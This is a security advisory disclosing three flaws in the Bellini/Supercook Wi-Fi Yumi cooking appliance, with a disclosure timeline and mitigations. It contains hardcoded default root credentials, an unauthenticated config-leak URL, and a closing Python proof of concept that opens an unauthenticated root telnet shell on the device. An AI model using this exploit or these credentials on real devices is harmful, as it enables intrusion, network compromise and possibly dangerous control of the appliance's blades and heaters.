'''
Bellini/Supercook Wi-Fi Yumi SC200 - Multiple vulnerabilities

Reported By:
==================================
James McLean -
 Primary: james dot mclean at gmail dot com
 Secondary: labs at juicedigital dot net

Device Overview:
==================================
From http://www.supercook.me/en/supercook/articles/btmkm800x/

"The Bellini.SUPERCOOK Kitchen Master is much more than a multifunctional
kitchen machine. It has 13 functions so not only saves a huge amount of
time, it also incorporates the Yumi control module and its own recipe
collection, making it incredibly easy to use."

Vulnerability Overview:
==================================
 Vuln1) Weak Username/Password for 'root' account.
 Vuln2) Information disclosure, unauthenticated.
 Vuln3) Remote arbitrary code execution.

CVE ID's
==================================
None assigned as yet.

Disclosure Timeline
==================================
2016-06-01: Vulnerability assessment commenced.
2016-07-04: Contacted Supercook.me support via Web Contact. No response.
2016-07-12: Contacted Supercook.me support via Web Contact. No response.
2016-07-12: Contacted Supercook Australia via Facebook. Supercook responded, saying they will view the support request. No further response recieved.
2016-07-19: Contacted Supercook Australia via Facebook. No response.
2016-07-21: Posted security assessment to vortex.id.au.
2016-07-22: Mitre contacted, CVE ID's requested.

It is with regret, but ultimately due to my concern for the community
that own these devices, that due to lack of communication I am disclosing
these vulnerabilities without the involvment of the vendor. I sincerely hope
that the vendor can resolve these issues in a timely manner.

I intend no malice by releasing these vulnerabilities, and only wish to
inform the community so appropriate steps may be taken by the owners of
these devices.

Due to the nature of the firmware on the device, these issues are not likely
caused by the vendor themselves.

Please do not use the information presented here for evil.

Affected Platforms:
==================================
Bellini/Supercook Wi-Fi Yumi SC200 - Confirmed affected: Vuln1, Vuln2, Vuln3.
Bellini/Supercook Wi-Fi Yumi SC250 - Likely affected, Vuln1, Vuln2, Vuln3, as
same firmware is used.

As the Wi-fi Yumi firmware appears to be based on a stock firmware image
used on a number of other commodity 'IoT' devices, the vulnerabilities
described here are very likely to affect other devices with similar or
the same firmware.

--

Vuln1 Details:
==================================
Weak Username/Password for Root-level account.
Username: super
Password: super

These credentials provide access to the built in FTP server and web
administration interface. We did not attempt any more than a cursory
connection to the FTP server with these details.

According to the details disclosed in Vuln2, an additional account is present
on the device with the following credentials:
Username: admin
Password: AlpheusDigital1010

With the exception of a cursory check of the built in FTP service (which
failed for these credentials), we did not attempt to access the device with
these credentials.

Vuln1 Notes:
==================================
We did not attempt to change or ascertain if it was possible to change these
access credentials; as Vuln2 completely negates any change made.

Vuln1 Mitigation:
==================================
Isolate the Supercook Wi-fi Yumi from any other Wireless network.
Revert to the non-wifi Yumi controller.

--

Vuln2 Details:
==================================
Information disclosure, unauthenticated.

Device URL: http://10.10.1.1/Setting.chipsipcmd

The device offers, via its built in webserver, a full list of all configuration
parameters available. This list includes the above mentioned root account
username and password, and the password to the parent connected wifi network.
All details are in plain text, and transmitted in the format of a key-value
pair making retrieval, recovery and use of all configuration
information trivial.

This interface is also available from the parent wi-fi network via DHCP assigned
IPv4 address.

Vuln2 Notes:
==================================
Example data returned:
DEF_IP_ADDR=10.10.1.1
DEF_SUBNET_MASK=255.255.255.0
...
DEF_SUPER_NAME="super"
DEF_SUPER_PASSWORD="super"
DEF_USER_NAME="admin"
DEF_USER_PASSWORD="AlpheusDigital1010"
...

Vuln2 Mitigation:
==================================
Isolate the Supercook Wi-fi Yumi from any other Wireless network, only using
the mobile application to upload recipes, then disconnect from the device and
connect your mobile device to a trusted network once again to access the
internet once again.

Revert to the non-wifi Yumi controller.

The vendor should establish a method of authentication to the device from the
various mobile applications available, and transport any configuration in an
encrypted format using keys which are not generally available or easily
discoverable.

--

Vuln3 Details:
==================================
Remote arbitrary code execution.

Device URL: http://10.10.1.1/syscmd.asp

The device offers a built-in web-shell which, once authenticated using the
details discovered in Vuln2, allows the execution of any command the device
can execute - as the built in webserver runs as the root user.

It is possible to execute a command using this interface that would create
any file in any location. This would allow an attacker to establish persistence.

Additionally, the built in busybox binary includes the option
'telnetd', meaning it is
possible to execute the relevant command to start a telnet daemon remotely.
The running daemon then requires no authentication to connect, and runs as
the root account.

Vuln3 Mitigation:
==================================
Isolate the Supercook Wi-fi Yumi from any other Wireless network.

Revert to the non-wifi Yumi controller.

Remove or prevent access to /syscmd.asp and /goform/formSysCmd scripts (Please
mind your warranty if you modify the files on the device).

The vendor should disable any and all commands on the device and scripts in
the web interface which are not specifically required for the normal
functionality of the device or its communication with control apps.

In this instance, the vendor should REMOVE the page '/syscmd.asp' and also
/goform/formSysCmd which processes commands submitted via syscmd.asp to prevent
arbitrary commands from being executed.

Additionally, busybox should be recompiled such that the 'telnetd' option is
no longer available to be executed.

--

Vuln1/Vuln2/Vuln3 Risks:
==================================
Weak and easily discoverable root credentials combined with easily accessed
remote shell functionality is a dangerous combination. These vulnerabilities
could allow any sufficiently advanced malware to become persistent in a LAN
and re-infect hosts at will (advanced crypto-locker style malware comes to
mind), capture and exfiltrate data on either Wireless network the device is
connected to, MITM any traffic routed through the device, or other as yet
unknown attack vectors.

Additionally, as full root access is easily obtainable, it may be possible
for an attacker to cause the cooking functionality to behave erratically or
possibly even dangerously due to the built in spinning blades and heating
elements. While we ultimately did not attempt to control these aspects of the
device due to the fact that it makes our dinner most nights, these risks are
worth raising.

This vulnerability assessment should not be considered an exhaustive list
of all vunlnerabilities the device may have. Due to time constraints we were
unable to invest the required time to discover and document all issues. Due to
the nature of the firmware on the device, most of these have likely been
discovered in other products at various times, this item may even duplicate
another from a similar device.

Notes:
==================================
No security assessment of code used for control of cooker functionality was
undertaken; as this does not, in my opinion, rate as seriously as the other
vulnerabilities discovered and disclosed here. However, it should be noted,
that with the root access that is VERY easily obtained, it may be possible for
an attacker to cause the cooking functionality of the machine to behave
erratically or even dangerously due to the built in spinning blades and heating
elements. Further to this, a malicious partner or offspring may intentionally
sabotage dinner, if he/she would prefer to eat takeout.

No attempt was made to connect to or manipulate files on the built in Samba
shares, however given the weak credentials sufficiently advanced malware may be
able to use these shares to establish persistence.

The 'Bellini' name may be regional, our device was procured in Australia and
as such may or may not have a different name in other countries.

A full, detailed, rundown and commentary is available at
https://www.vortex.id.au/2016/07/bellini-supercook-yumi-wi-fi-the-insecurity-perspective/

Vuln3 Proof of Concept:
==================================
'''

#!/usr/bin/env python

import urllib
import urllib2
from subprocess import call

# Connect to the device's wifi network, then run.
# Root access will be provided.

url = 'http://10.10.1.1/goform/formSysCmd'
cmd = 'busybox telnetd -l /bin/sh'
username = 'super'
password = 'super'

# setup the password handler
basicauth = urllib2.HTTPPasswordMgrWithDefaultRealm()
basicauth.add_password(None, url, username, password)

authhandler = urllib2.HTTPBasicAuthHandler(basicauth)
opener = urllib2.build_opener(authhandler)

urllib2.install_opener(opener)

# Connect to the device, send the data
values = {
    'sysCmd': cmd,
    'apply': 'Apply',
    'submit-url': '/syscmd.asp'
}
data = urllib.urlencode(values)
pagehandle = urllib2.urlopen(url, data)

# Connect to Telnet.
call(["telnet","10.10.1.1"])

# Pwnd.

# End of document.